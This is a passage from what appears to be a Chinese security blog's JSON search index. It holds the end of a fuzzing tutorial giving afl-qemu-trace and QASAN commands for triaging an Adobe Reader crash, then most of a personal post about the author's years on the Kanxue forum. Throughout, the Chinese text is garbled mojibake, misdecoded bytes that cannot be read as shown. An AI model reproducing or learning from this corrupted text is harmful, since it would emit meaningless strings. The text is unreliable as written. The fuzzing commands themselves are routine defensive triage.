","date":"2022-01-16","objectID":"/2022/01/fuzzing101-8/:3:2","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 8","uri":"/2022/01/fuzzing101-8/"},{"categories":["Fuzz"],"content":"3. Triage åœ¨å‘ç”Ÿ crash ä¹‹åï¼Œæˆ‘ä»¬æ¥æ£€æµ‹è¿™ä¸ª OOB read æ¼æ´ï¼š ACRO_INSTALL_DIR=/opt/Adobe/Reader9/Reader ACRO_CONFIG=intellinux LD_LIBRARY_PATH=opt/Adobe/Reader9/Reader/intellinux/lib /usr/local/bin/afl-qemu-trace -- /opt/Adobe/Reader9/Reader/intellinux/bin/acroread -toPostScript [crashFilePath] å¦‚æœæŒ‰ç…§ä¸Šé¢çš„å¸¸è§„çš„å‘½ä»¤æ¥æ‰§è¡Œ traceï¼Œä¼šæŠ¥é¡µé”™è¯¯ã€‚æ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨å¦å¤–ä¸€ç§æ–¹æ³•â€”â€” QASAN AFL_USE_QASAN=1 ACRO_INSTALL_DIR=/opt/Adobe/Reader9/Reader ACRO_CONFIG=intellinux LD_LIBRARY_PATH=opt/Adobe/Reader9/Reader/intellinux/lib /usr/local/bin/afl-qemu-trace -- /opt/Adobe/Reader9/Reader/intellinux/bin/acroread -toPostScript [crashFilePath] ç„¶åå°±èƒ½çœ‹åˆ°è§¦å‘çš„ stacktraceï¼š ","date":"2022-01-16","objectID":"/2022/01/fuzzing101-8/:4:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 8","uri":"/2022/01/fuzzing101-8/"},{"categories":["Life"],"content":"è®°å½•ä¸€ä¸‹æˆ‘ä¸çœ‹é›ªçš„é‚£äº›äº‹å„¿","date":"2021-12-31","objectID":"/2021/12/%E6%88%91%E4%B8%8E%E7%9C%8B%E9%9B%AA%E7%9A%84%E6%95%85%E4%BA%8B/","tags":["Life"],"title":"æˆ‘ä¸çœ‹é›ªçš„æ•…äº‹","uri":"/2021/12/%E6%88%91%E4%B8%8E%E7%9C%8B%E9%9B%AA%E7%9A%84%E6%95%85%E4%BA%8B/"},{"categories":["Life"],"content":"å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯æœ‰æ¯’ï¼Œä¸€ä¸ªäºŒè¿›åˆ¶å®‰å…¨å­¦ä¹ çš„â€œå°å­¦ç”Ÿâ€ã€‚ä»Šå¤©æ˜¯2021å¹´çš„æœ€åä¸€å¤©ï¼Œæˆ‘åŠ å…¥çœ‹é›ªå·²ç»5å¹´äº†ï¼Œçªç„¶æƒ³å†™ç‚¹æŠ€æœ¯æ— å…³çš„ä¸œè¥¿ï¼Œè®°å½•ä¸€ä¸‹ä¸çœ‹é›ªçš„æ•…äº‹ã€‚é¥­åé—²è°ˆï¼Œçœ‹å®˜ä»¬æ–‡äº†è¯ç»ˆã€‚ ","date":"2021-12-31","objectID":"/2021/12/%E6%88%91%E4%B8%8E%E7%9C%8B%E9%9B%AA%E7%9A%84%E6%95%85%E4%BA%8B/:0:0","tags":["Life"],"title":"æˆ‘ä¸çœ‹é›ªçš„æ•…äº‹","uri":"/2021/12/%E6%88%91%E4%B8%8E%E7%9C%8B%E9%9B%AA%E7%9A%84%E6%95%85%E4%BA%8B/"},{"categories":["Life"],"content":"åˆæ¬¡ç›¸é‡ â€“ æƒŠå–œ 2017å¹´12æœˆ25æ—¥ï¼Œåœ£è¯èŠ‚è¿™å¤©ï¼Œæˆ‘æ³¨å†Œäº†çœ‹é›ªã€‚å…¶å®åœ¨è¿™ä¹‹å‰ï¼Œä¹Ÿæœ‰å¬åˆ°è¿‡è®ºå›ã€‚å› ä¸ºä¸ªäººéå¸¸å–œæ¬¢é›ªï¼Œæ‰€ä»¥å½“æ—¶çš„ç¬¬ä¸€æ„Ÿè§‰æ˜¯ï¼Œåå­—çœŸå¥½å¬ï¼Œåº”è¯¥æ˜¯ä¸€ä¸ªæ„Ÿæƒ…ä¸°å¯Œçš„æ–‡è‰ºé’å¹´åˆ›å»ºçš„ä¸ªäººåšå®¢å§ã€‚å½“æˆ‘æ‰“å¼€è®ºå›çš„æ—¶å€™ï¼Œæ„Ÿå—åˆ°äº†ä»¿ä½›æ‰“å¼€æ–°ä¸–ç•Œä¸€æ ·çš„æƒŠå–œã€‚ å…¶å®å½“æ—¶æˆ‘è¿˜æ²¡æœ‰ä»äº‹å®‰å…¨æ–¹å‘ï¼Œä¸»è¦èšç„¦åœ¨å¼€å‘ä¸Šï¼Œæ‰€ä»¥ä¹Ÿæœ‰å…³æ³¨ä¸€äº›å¼€å‘ç±»çš„è®ºå›ã€‚ä½†æ˜¯çœ‹åˆ°çœ‹é›ªçš„ç¬¬ä¸€çœ¼ï¼Œæˆ‘å°±è§‰å¾—æˆ‘åº”è¯¥ä¼šæŒç»­å…³æ³¨å®ƒäº†ï¼Œä¸ä¸ºåˆ«çš„ï¼Œåªä¸ºåå­—å’Œå¹²è´§ã€‚çœ‹äº†å¤§å®¶çš„æ–‡ç« ä¹‹åï¼Œèƒ½æ„Ÿè§‰å‡ºæ¥ï¼Œè¿™äº›ä¼˜ç§€çš„ä½œè€…éƒ½æ˜¯ç®€å•ã€çº¯ç²¹çš„æŠ€æœ¯äººå‘˜ï¼Œå’Œæˆ‘ç›¸æ€§å¾ˆåˆã€‚ä½†æ˜¯æˆ‘å¹¶ä¸æ˜¯æå®‰å…¨çš„ï¼Œæ‰€ä»¥å¾ˆå¤šæŠ€æœ¯å±‚é¢çš„å†…å®¹çœ‹ä¸æ‡‚ï¼Œä½†æ˜¯å­—é‡Œè¡Œé—´è¿˜æ˜¯èƒ½æ„Ÿå—åˆ°ä½œè€…æƒ³è¦è¡¨è¾¾çš„å¿ƒæƒ…ï¼ŒçœŸçš„æ˜¯å¾ˆå•ä¸€ã€çƒ­æƒ…çš„åˆ†äº«çš„å–œæ‚¦çš„å¿ƒæƒ…ã€‚ æˆ‘æ³¨å†Œäº†çœ‹é›ªçš„è´¦å·ï¼Œèµ·åå­—çš„æ—¶å€™æƒ³äº†åŠå¤©ï¼Œä¸çŸ¥é“å«ä»€ä¹ˆã€‚æˆ‘çœ‹è®ºå›é‡Œå¤§å®¶éƒ½æ˜¯Leeté£æ ¼ï¼ˆå½“æ—¶è¿˜ä¸çŸ¥é“è¿™ç§é£æ ¼ï¼‰çš„åç§°ï¼Œæƒ³çš„å°±æ˜¯è‡ªå·±èµ·ä¸€ä¸ªè‹±æ–‡åå­—ã€‚ä½†æ˜¯å½“æ—¶çš„è‹±æ–‡åå­—çº¯ç²¹æ˜¯å®ä¹ çš„æ—¶å€™å…¬å¸å†…éƒ¨ä½¿ç”¨çš„ï¼Œåªæ˜¯ä¸ºäº†å¤–è¯­ä¸šåŠ¡ä½¿ç”¨çš„ï¼Œä¸ªäººå¹¶ä¸æ˜¯ç‰¹åˆ«å–œæ¬¢ã€‚æƒ³æ¥æƒ³å»ï¼Œè¿˜æ˜¯æ²¿ç”¨äº†ä¹‹å‰å°ä¼™ä¼´ä¸€ç›´å–œæ¬¢å«çš„åå­— â€“ æœ‰æ¯’ã€‚å› ä¸ºä»–ä»¬æ€»è¯´æˆ‘æœ‰æ¯’ï¼Œè¯´ä»€ä¹ˆå°±å‘½ä¸­ä»€ä¹ˆï¼Œè·Ÿé¢„è¨€å®¶ä¸€æ ·ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯åçš„ï¼Œæ‰€ä»¥ä¸å«é¢„è¨€å®¶ï¼Œè€Œæ˜¯æœ‰æ¯’ã€‚åæ¥æƒ³æƒ³ï¼Œæˆ–è®¸æˆ‘è‹±æ–‡åå­—å¯ä»¥å«Murphyï¼ˆå¢¨è²å®šå¾‹å˜›ï¼‰ã€‚ å°±è¿™æ ·ï¼Œæœ‰æ¯’åŠ å…¥äº†çœ‹é›ªã€‚ ","date":"2021-12-31","objectID":"/2021/12/%E6%88%91%E4%B8%8E%E7%9C%8B%E9%9B%AA%E7%9A%84%E6%95%85%E4%BA%8B/:1:0","tags":["Life"],"title":"æˆ‘ä¸çœ‹é›ªçš„æ•…äº‹","uri":"/2021/12/%E6%88%91%E4%B8%8E%E7%9C%8B%E9%9B%AA%E7%9A%84%E6%95%85%E4%BA%8B/"},{"categories":["Life"],"content":"é€æ¸èå…¥ â€“ å­¦ä¹  æœ¬ç§‘çš„æ—¶å€™ï¼Œå®ä¹ æœŸé—´å»æ‰¾äº†ä¸€ä»½.NETå¼€å‘çš„å·¥ä½œï¼Œå¹²äº†æœ‰4ä¸ªæœˆå§ï¼Œæˆ‘è§‰å¾—æˆ‘å¯èƒ½å¯¹è‡ªå·±æœ‰é”™è¯¯çš„è®¤çŸ¥ã€‚å¹¶ä¸æ˜¯ä¸å–œæ¬¢è¿™ä¸ªæŠ€æœ¯æ–¹å‘ï¼Œè€Œæ˜¯æˆ‘è§‰å¾—æˆ‘è§†é‡ä¸å¤Ÿå®½ï¼Œçœ‹åˆ°çš„ä¸œè¥¿å¤ªå°‘ï¼Œä¼šå½±å“ä½ çš„ä¸€äº›å†³ç­–ã€‚æˆ‘æ¯…ç„¶è¾èŒå»è€ƒç ”äº†ã€‚ ä¸Šäº†ç ”ç©¶ç”Ÿé€‰å¯¼å¸ˆçš„æ—¶å€™ï¼Œé¦–é€‰è¿˜æ˜¯è½¯å¼€çš„ï¼Œä½†æ˜¯æ— æ„é—´æœ‰ä¸ªåšå®‰å…¨çš„å¯¼å¸ˆè”ç³»æˆ‘å¸Œæœ›èƒ½å½“é¢èŠä¸€ä¸‹ï¼Œç„¶åæˆ‘å°±å…¥å‘äº†ã€‚åœ¨è¿™æœŸé—´ï¼Œæˆ‘å¼€å§‹ä»0å­¦èµ·å®‰å…¨æ–¹å‘ï¼Œä¹Ÿæ˜¯åœ¨è¿™æœŸé—´ï¼Œæˆ‘æ³¨å†Œäº†çœ‹é›ªã€‚ç„¶åï¼Œå¼€å§‹åœ¨ä¸Šé¢è·Ÿç€å­¦ä¹ ã€‚ æˆ‘åˆšå¼€å§‹æ˜¯ä¸æ•¢å‘å¸–å­çš„ï¼Œå› ä¸ºæˆ‘è§‰å¾—æˆ‘æ°´å¹³ä¸å¤Ÿï¼Œå‘å‡ºæ¥çš„ä¸œè¥¿éƒ½æ˜¯æµ…æ˜¾ï¼Œæ²¡æœ‰å¹²è´§ï¼Œæ‰€ä»¥ç»å¤§éƒ¨åˆ†æ—¶é—´éƒ½æ˜¯çœ‹ä¸Šé¢çš„æ–‡ç« å­¦ä¹ ã€‚çœ‹é›ªæœ‰ä¸ªæˆ‘è‡³ä»Šè§‰å¾—éƒ½å¾ˆå‰å®³çš„å†…å®¹â€”â€”çŸ¥è¯†åº“ã€‚è¿™ç®€ç›´æ˜¯å¼€æºçš„äºŒè¿›åˆ¶å®‰å…¨çš„ç™¾ç§‘å…¨ä¹¦ï¼Œæƒ³å­¦çš„å†…å®¹åŸºæœ¬å…¨è¦†ç›–ï¼Œæˆ‘ç”±è¡·ä½©æœå½“æ—¶å°±æœ‰è¿™ç§çŸ¥è¯†åº“æƒ³æ³•çš„è®¾è®¡è€…ã€‚ å­¦ä¹ æœŸé—´ä¹Ÿæœ‰è¿·èŒ«ï¼Œå°¤å…¶æ˜¯æˆ‘è¿™ç§ç›´æ¥è¿›å…¥äºŒè¿›åˆ¶ä¸–ç•Œçš„äººã€‚å½“æ—¶å‘¨å›´çš„äººéƒ½æ˜¯webå‡ºå‘ï¼Œåªæœ‰æˆ‘è‡ªå·±æ˜¯ç›´æ¥è¿›å…¥çš„äºŒè¿›åˆ¶ï¼Œå°±å¾ˆå­¤ç‹¬ã€‚æ‰€ä»¥æˆ‘çš„ç¬¬ä¸€ã€ç¬¬äºŒä¸ªå¸–å­éƒ½æ˜¯å…³äºè¿™ç§æ–¹å‘ç±»çš„é€‰æ‹©çŠ¹è±«ã€‚å…¶ä¸­æœ‰ä¸ªå›ç­”å¾ˆå¥½åœ°è§£å†³äº†æˆ‘è¿™ä¸ªé—®é¢˜ï¼š æˆ‘å¾ˆæ„Ÿè°¢è¿™ä½â€œé›ªäººâ€çš„ç­”å¤ï¼ˆå¦‚æœæœ¬äººè§‰å¾—æ”¾è¿™é‡Œä¸åˆé€‚ï¼Œè¯·è”ç³»æˆ‘åˆ é™¤ï¼‰ã€‚æ­£æ˜¯ä»–çš„è¿™å‡ å¥è¯ï¼Œå¸®åŠ©æˆ‘åšå®šäº†è‡ªå·±çš„å†³å¿ƒã€‚ä»ä»–çš„ä»‹ç»å‡ºå‘ï¼Œæˆ‘è‡ªå·±googleäº†ä¸¤ä¸ªå¤§æ–¹å‘çš„ç»†èŠ‚å†…å®¹ï¼Œè§‰å¾—è‡ªå·±çš„æ€§å­å¯èƒ½è¿˜æ˜¯é€‚åˆäºŒè¿›åˆ¶ï¼Œè€Œä¸”ä¹Ÿäº«å—é‚£ç§ååº•å±‚ä¸€ç‚¹çš„åˆ†æçš„è¿‡ç¨‹å’Œæ„Ÿè§‰ã€‚ å†åæ¥ï¼Œå°±æ˜¯ç¨³æ‰ç¨³æ‰“åœ°æ…¢æ…¢å­¦ï¼Œè·Ÿç€çœ‹é›ªçŸ¥è¯†åº“ï¼Œè·Ÿç€è®ºå›ä¸Šå¤§ç‰›çš„å¸–å­ï¼Œè·Ÿç€ã€ŠåŠ è§£å¯†ã€‹å’Œã€Š0dayã€‹ï¼Œä¸­é—´é¡ºé“å»æ‰“æ‰“CTFï¼Œæ‰©å±•ä¸€ä¸‹çŸ¥è¯†é¢ï¼ˆæˆ‘å‘ç°æˆ‘ä¸ªäººçœŸçš„ä¸é€‚åˆCTFï¼Œç©ä¸æ¥ï¼Œè™½ç„¶å¾ˆå–œæ¬¢-ã€‚-ï¼‰ï¼Œé‡å¿ƒè¿˜æ˜¯åœ¨è®ºæ–‡ä¸Šï¼ˆæˆ‘å¯¼å¸ˆçš„è®ºæ–‡è¦æ±‚å¤ªé«˜äº†ï¼Œæ²¡åŠæ³•ï¼‰ã€‚ è®ºæ–‡å®Œæˆä¹‹åï¼Œæˆ‘å°±å»äº†å®ä¹ ã€‚å½“æ—¶è§‰å¾—è‡ªå·±æ°´å¹³ä¸å¤Ÿï¼Œé™¤äº†è®ºæ–‡ä¸­å¼€å‘çš„ä¸€ä¸ªæ¡†æ¶ï¼Œå…¶ä»–ä»€ä¹ˆæˆæœä¹Ÿæ²¡æœ‰ï¼ŒCTFä¹Ÿæ²¡æœ‰æˆç»©ï¼Œæ‰€ä»¥æ²¡æƒ³åˆ°èƒ½æˆåŠŸã€‚å¾ˆæ„Ÿè°¢å½“æ—¶é¢è¯•æˆ‘çš„é‚£ä½æ¶æ„å¸ˆå¤§ä½¬ï¼Œè™½ç„¶ä»–æœ¬æ„æ˜¯æƒ³æ‹›ä¸€ä¸ªå®‰å…¨å¼€å‘ï¼Œä½†æœ€åè¿˜æ˜¯æ”¶ä¸‹äº†æˆ‘ï¼Œåªæ˜¯æ²¡æœ‰è¿›ä»–çš„ç»„ï¼Œè€Œæ˜¯å»äº†æ¼æ´ç»„ã€‚ç„¶åæˆ‘å°±å¼€å§‹äº†æˆ‘è§‰å¾—æˆé•¿æœ€å¿«çš„ä¸€æ®µæ—¶é—´ï¼Œç»ˆäºåœ¨2019å¹´çš„4æœˆ5æ—¥ï¼Œæˆ‘å‘äº†æˆ‘åœ¨çœ‹é›ªçš„ç¬¬ä¸€ç¯‡æŠ€æœ¯æ–‡ç« â€”â€”ã€ŠWindows SMBåè®®ç®€å•åˆ†æã€‹ï¼ŒBDomneç‰ˆä¸»è¿˜ç»™äº†ä¼˜ç§€è´´ã€‚è™½ç„¶è¿™æ–‡ç« ç°åœ¨çœ‹æ¥å¾ˆæ°´ï¼Œä½†æ˜¯å½“æ—¶çœŸçš„ååˆ†å¼€å¿ƒã€‚æˆ‘è§‰å¾—æˆ‘ä¸€ç›´åœ¨ä»çœ‹é›ªã€ä»å…¶ä»–äººæ‰‹é‡Œâ€œæ‹¿â€ä¸œè¥¿ï¼Œç°åœ¨ä¹Ÿèƒ½ç»™å‡ºä¸€äº›å›æŠ¥äº†ã€‚æŠ±ç€è¿™ç§å¿ƒæƒ…ï¼Œåœ¨2019å¹´ï¼Œä¹Ÿäº§å‡ºäº†ä¸€äº›å…¶ä»–æ–‡ç« ï¼Œä½†æ˜¯ç°åœ¨çœ‹æ¥å½“æ—¶çš„è‡ªå·±æ°´å¹³çœŸçš„ä¸€èˆ¬ï¼Œå¤§éƒ¨åˆ†æ˜¯ä¸€äº›æ¯”è¾ƒç®€é™‹çš„æ¼æ´åˆ†æå’Œç®€å•çš„CTFé¢˜è§£ã€‚æˆ‘æ„è¯†åˆ°è‡ªå·±å’Œè®ºå›é‡Œç²¾åå¸–å¤§ç‰›ä»¬çš„å·®è·ï¼ŒåŒæ—¶å‘ç°è‡ªå·±æœ‰ç‚¹æµ®èºäº†ï¼Œå†³å®šè‡ªæˆ‘æ²‰æ·€ä¸€ä¸‹ã€‚æœŸé—´å‚åŠ äº†2019å¹´çš„SDCï¼Œå±äºæ˜¯ç¬¬ä¸€æ¬¡å‚åŠ çš„å®‰å…¨æ–¹å‘çº¿ä¸‹ä¼šè®®ã€‚æˆ‘å½“æ—¶çš„æƒ³æ³•æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯è§‰å¾—è‡ªå·±åŠ å…¥çœ‹é›ªæ˜¯å¯¹çš„ï¼Œä¸€ä¸ªæ˜¯æƒ³çš„æ€»æœ‰ä¸€å¤©æˆ‘ä¹Ÿè¦ä¸Šå»åˆ†äº«ä¸€æ¬¡ã€‚ åœ¨2020å¹´ï¼Œæˆ‘å‘Šè¯‰è‡ªå·±ï¼Œå¦‚æœæ˜¯æŠ€æœ¯å¸–ï¼Œä¸€å®šè¦å‘ç²¾åå¸–ï¼Œå®ç¼ºæ¯‹æ»¥ã€‚æˆ‘å¸Œæœ›å‘å‡ºæ¥çš„æ–‡ç« æ˜¯çœŸçš„æœ‰å†…å®¹åœ¨é‡Œé¢ï¼Œæœ‰èƒ½å¾—åˆ°å¤§ä½¬ä»¬è®¤å¯çš„æŠ€æœ¯èƒ½åŠ›åœ¨é‡Œé¢ï¼Œæ„Ÿè§‰è¿™æ ·æ‰æ˜¯è·Ÿçœ‹é›ªåˆè¡·ã€è·Ÿå½“æ—¶è¿›å…¥çœ‹é›ªçš„æˆ‘çš„åˆè¡·ç›¸ä¸€è‡´çš„ã€‚2020å¹´åˆ†æäº†å¾ˆå¤šçš„æ¼æ´ï¼ŒæŠŠè‡ªå·±çš„ä¸€äº›åˆ†ææˆæœæ²‰æ·€åˆ°äº†è®ºå›é‡Œã€‚åœ¨è¿™ä¸€å¹´ï¼Œåšåˆ°äº†æ¯ä¸ªå¸–å­éƒ½æ˜¯ç²¾åå¸–ï¼ˆæœ‰ä¸€äº›ç°åœ¨çœ‹æ¥æ˜¯æœ‰æ¬ ç¼ºçš„ï¼Œå½“æ—¶æ–‡æ¡£èƒ½åŠ›ä¸ç¨³å®šï¼Œå¾ˆå¤šæƒ³è¡¨è¾¾çš„ä¸œè¥¿æ²¡æœ‰è¡¨è¾¾æ¸…æ¥šï¼‰ã€‚å¹´ç»ˆçš„æ—¶å€™ï¼Œè¢«è¯„ä¸ºäº†çœ‹é›ª2020å¹´çš„å¹´åº¦æ–°äººã€‚è¿™æœŸé—´ï¼Œç»§ç»­å‚åŠ äº†çœ‹é›ª2020çš„SDCã€‚æˆ‘å®åŠ›ä»ç„¶ä¸å¤Ÿï¼Œå½“ä¸äº†æ¼”è®²å˜‰å®¾ã€‚ä½†æ˜¯ï¼Œæˆ‘ä¸ªäººè§‰å¾—ï¼Œ2020å¹´æ‰æ˜¯æˆ‘çœŸæ­£ä¸ºçœ‹é›ªåšå‡ºç‚¹ä¸œè¥¿çš„ä¸€å¹´ã€‚ 2021å¹´çš„1æœˆ19å·ï¼Œæˆ‘ç”³è¯·äº†çœ‹é›ªè®ºå›äºŒè¿›åˆ¶æ¼æ´æ¿å—çš„ç‰ˆä¸»ã€‚ä½†æ˜¯è·Ÿæ®µå“¥èŠäº†å¾ˆä¹…ï¼Œæˆ‘çš„æœ¬æ„æ˜¯é™¤äº†æ–‡ç« ä¹‹å¤–ï¼Œæˆ‘æƒ³ä¸ºçœ‹é›ªåšä¸€ç‚¹å…¶ä»–çš„è´¡çŒ®ï¼Œä½†æ˜¯å¯¹è‡ªå·±çš„èƒ½åŠ›ç¼ºä¹ä¿¡å¿ƒã€‚æ®µå“¥å½“æ—¶ç»™äº†æˆ‘å¾ˆå¤§çš„é¼“èˆï¼Œè®©æˆ‘å¾ˆè§¦åŠ¨ã€‚æˆä¸ºç‰ˆä¸»åï¼Œå°†è‡ªå·±ä¹‹å‰æ€»ç»“çš„ä¸€ä»½ç›¸å¯¹æ¯”è¾ƒå…¨é¢çš„äºŒè¿›åˆ¶æ¼æ´åˆ†ææ–‡æ¡£çš„æ¨¡æ¿å…±äº«äº†å‡ºæ¥ã€‚è™½ç„¶æˆ‘ä»¬ä¸å¼ºè°ƒå›ºå®šçš„å¥—ç‰ˆæ€è·¯ï¼Œä½†æ˜¯åœ¨æ–‡æ¡£ç¼–å†™ä¸Šï¼Œæˆ‘ä¸ªäººæ„Ÿè§‰è¿˜æ˜¯è§„èŒƒåŒ–æ›´å¥½ä¸€ç‚¹ã€‚ç„¶åæ€»ç»“äº†ä¸€ä»½äºŒè¿›åˆ¶æ¼æ´åˆ†æçš„è„‘å›¾ï¼Œå‚è€ƒå¤§å®¶çš„æ„è§è¿›è¡Œäº†å‡ æ¬¡ä¼˜åŒ–ï¼Œå½“ä½œç»™å’Œå½“åˆçš„æˆ‘ä¸€æ ·çš„æ–°äººä»¬çš„ä¸€ä»½å‚è€ƒã€‚æˆ‘æ—¥å¸¸ä¼šå®¡æ ¸ä¸€äº›æ¿å—çš„å¸–å­ã€‚èµ·åˆï¼Œæ˜¯æœ‰ä¸€äº›åƒåŠ›çš„ï¼Œå› ä¸ºå®¡æ ¸ä¸€ç¯‡å¸–å­éœ€è¦èŠ±è´¹çš„æ—¶é—´è¿˜æ˜¯å¾ˆä¹…çš„ï¼Œå¯¹äºä¸€äº›æŠ€æœ¯ç‚¹å¯èƒ½ä½ ä¹‹å‰æ ¹æœ¬æ²¡æœ‰æ¶‰åŠè¿‡ï¼Œéœ€è¦æŸ¥èµ„æ–™æˆ–è€…è¯·æ•™æœ‹å‹å»å…±åŒå®¡æ ¸ã€‚å‘å‡ºæ¥çš„æ–‡ç« éƒ½æ˜¯å¤§å®¶è¾›è‹¦ç¼–å†™çš„ï¼Œæˆ‘è§‰å¾—è¿˜æ˜¯éœ€è¦ååˆ†æ…é‡å¯¹å¾…çš„ï¼Œè¦å¯¹å¾—èµ·ä½œè€…çš„è¾›è‹¦ä»˜å‡ºã€‚æ–‡ç« å®¡æ ¸çš„å·¥ä½œï¼Œè®©æˆ‘è§åˆ°äº†æ›´å¤šçš„æŠ€æœ¯å¤§ä½¬ï¼Œä¹Ÿè®©æˆ‘å­¦ä¹ åˆ°äº†å¾ˆå¤šã€‚2021å¹´çš„SDCï¼Œä¹Ÿæœ‰å‚åŠ ï¼Œä½†æ˜¯å› ä¸ºæ—¶é—´é—®é¢˜ï¼Œæ²¡èƒ½å‚åŠ æœ€åçš„çœ‹é›ªé—­é—¨èšé¤ï¼Œæ˜¯ååˆ†é—æ†¾çš„ï¼Œæ„Ÿè°¢æ®µå“¥çš„é‚€è¯·å§ï¼Œå¸Œæœ›æ˜å¹´çš„SDCæˆ‘å¯ä»¥å¸¦ç€è®®é¢˜å»ã€‚2021å¹´æ–‡ç« äº§å‡ºæ•°é‡ä¸‹é™äº†ï¼Œä¸»è¦æ˜¯æ¢äº†æ–°æ–¹å‘ï¼Œè¿˜åœ¨æ‘¸ç´¢é˜¶æ®µï¼Œæœ‰äº›ä¸œè¥¿å¤ªæ•æ„Ÿä¸èƒ½å‘ï¼Œæœ‰äº›ä¸œè¥¿æŠ€æœ¯å«é‡ä¸å¤Ÿä¸å€¼å¾—å‘ï¼Œæ‰€ä»¥å¯¼è‡´æ–‡ç« æ•°é‡ä¸‹é™ï¼Œä½†æ˜¯è´¨é‡æˆ‘è¿˜æ˜¯å¯ä»¥ä¿è¯çš„ï¼Œå¸Œæœ›2022å¹´å¯ä»¥å†æ¥ä¸€æ¬¡çˆ†å‘å§ã€‚ ","date":"2021-12-31","objectID":"/2021/12/%E6%88%91%E4%B8%8E%E7%9C%8B%E9%9B%AA%E7%9A%84%E6%95%85%E4%BA%8B/:2:0","tags":["Life"],"title":"æˆ‘ä¸çœ‹é›ªçš„æ•…äº‹","uri":"/2021/12/%E6%88%91%E4%B8%8E%E7%9C%8B%E9%9B%AA%E7%9A%84%E6%95%85%E4%BA%8B/"},{"categories":["Life"],"content":"å†¥å†¥ä¹‹ä¸­çš„ç¼˜åˆ† æ€»è§‰å¾—å’Œçœ‹é›ªæœ‰ä¸€ç§å†¥å†¥ä¹‹ä¸­çš„ç¼˜åˆ†ï¼Œå› ä¸ºç ”ç©¶ç”Ÿé˜¶æ®µçš„ç ”ç©¶æ–¹å‘æ˜¯å†…å­˜å–è¯ï¼ŒåŸºæœ¬æ˜¯çº¯äºŒè¿›åˆ¶çš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘æ²¡æœ‰æ¥è§¦è¿‡å¤šçš„webå®‰å…¨ï¼Œè¿™åˆšå¥½è·Ÿçœ‹é›ªè®ºå›çš„ä¸»è¦å†…å®¹ä¸€è‡´ï¼Œæ‰€ä»¥å°±å¾ˆå¯¹å‘³ã€‚å†ç„¶åå¼€å§‹ä¹°ã€ŠåŠ è§£å¯†ã€‹ã€ã€Š0dayã€‹æ¥çœ‹ï¼Œå‘ç°è¿™ä¸¤æœ¬ä¹¦è¿˜æ˜¯è·Ÿçœ‹é›ªæœ‰å¾ˆå¤§çš„æ¸Šæºã€‚æˆ‘å½“æ—¶çœŸçš„æ¬£å–œè‹¥ç‹‚ã€‚å› ä¸ºçœ‹é›ªæ˜¯æˆ‘å…¨è‡ªä¸»å‘ç°çš„ï¼Œè‡ªå·±æ¢ç´¢åˆ°çš„ï¼Œæ°å¥½å°±æ˜¯æˆ‘çš„ç ”ç©¶æ–¹å‘ç›¸å…³çš„ï¼Œä¹Ÿæ˜¯æˆ‘ä¸ªäººæ„Ÿå…´è¶£çš„ã€‚æˆ‘è§‰å¾—è¿™å¯¹æˆ‘æ¥è¯´æ˜¯ä¸€ç§å¾ˆå¤§çš„ç¼˜åˆ†ï¼Œä¹Ÿæ˜¯ä¸€ç§å¾ˆå¤§çš„å¹¸è¿ã€‚è¯•æƒ³ä¸€ä¸‹å½“æ—¶å¦‚æœæ²¡æœ‰çœ‹é›ªè®ºå›ï¼Œæ²¡æœ‰çŸ¥è¯†åº“ï¼Œæ²¡æœ‰æ¯å¹´çš„çœ‹é›ªç²¾ååˆé›†ï¼Œæ²¡æœ‰è®ºå›é‡Œæ¯ä½æŠ€æœ¯å¤§ä½¬çš„æ— ç§åˆ†äº«ï¼Œä½œä¸ºæ–°ä¸€è¾ˆçš„äºŒè¿›åˆ¶å®‰å…¨å­¦ä¹ äººå‘˜å¯èƒ½å¹¶ä¸èƒ½å¾ˆå¥½åœ°å»ºç«‹å…¨é¢çš„äºŒè¿›åˆ¶å®‰å…¨ä½“ç³»ï¼Œå¹¶ä¸èƒ½ç»“è¯†åˆ°åœˆé‡Œè¿™äº›å®‰å…¨å‰è¾ˆï¼Œå¦‚æœçœŸçš„è¿™æ ·ï¼Œæˆ‘çœŸå¿ƒè§‰å¾—æ˜¯ä¸€ç§é—æ†¾ã€‚ ","date":"2021-12-31","objectID":"/2021/12/%E6%88%91%E4%B8%8E%E7%9C%8B%E9%9B%AA%E7%9A%84%E6%95%85%E4%BA%8B/:3:0","tags":["Life"],"title":"æˆ‘ä¸çœ‹é›ªçš„æ•…äº‹","uri":"/2021/12/%E6%88%91%E4%B8%8E%E7%9C%8B%E9%9B%AA%E7%9A%84%E6%95%85%E4%BA%8B/"},{"categories":["Life"],"content":"ä¸€ç›´èµ°ä¸‹å» ç°åœ¨ï¼ŒçŸ¥è¯†ä»˜è´¹çš„é£æ½®æ­£åŠ²ã€‚ä¸çŸ¥é“æ˜¯ç¯å¢ƒé—®é¢˜ï¼Œè¿˜æ˜¯å‘å±•åˆ°ä»Šå¤©å°±å¿…å®šè¦ç»å†è¿™ä¸ªé˜¶æ®µï¼Œå¤§å®¶å¼€å§‹æµ®èºäº†ï¼Œå¼€å§‹æ€¥åŠŸè¿‘åˆ©ï¼Œå¼€å§‹ä»€ä¹ˆäº‹æƒ…éƒ½å¼€å§‹è·Ÿåˆ©ç›ŠæŒ‚é’©ã€‚æ–°å£°ä»£ä¸ä¹æŠ€æœ¯ç‰›äººï¼Œä½†æ˜¯è¿˜ç§‰æŒç€åˆå¿ƒçš„ï¼Œæˆ‘æ„Ÿè§‰å¤ªå°‘äº†ã€‚è¿™æ˜¯æˆ‘ä»¬è·Ÿå®‰å…¨è€å‰è¾ˆä»¬çš„å·®è·ã€‚çœ‹ç€å¥½å¤šäººæœ‰ä¸€ç‚¹æˆç»©åå¼€å§‹å„ç§æ¸ é“å»å‰²éŸ­èœã€åœˆé’±ï¼Œæˆ‘å°±æƒ³åˆ°åœ¨åˆšè¿›å…¥çœ‹é›ªçš„æ—¶å€™ï¼Œçœ‹é›ªç»™æˆ‘çš„é‚£ç§çº¯å‡€çš„æ„Ÿè§‰ã€‚è‡³ä»Šä¸ºæ­¢ï¼Œçœ‹é›ªè®ºå›æœ¬èº«æ²¡æœ‰é æ–‡ç« 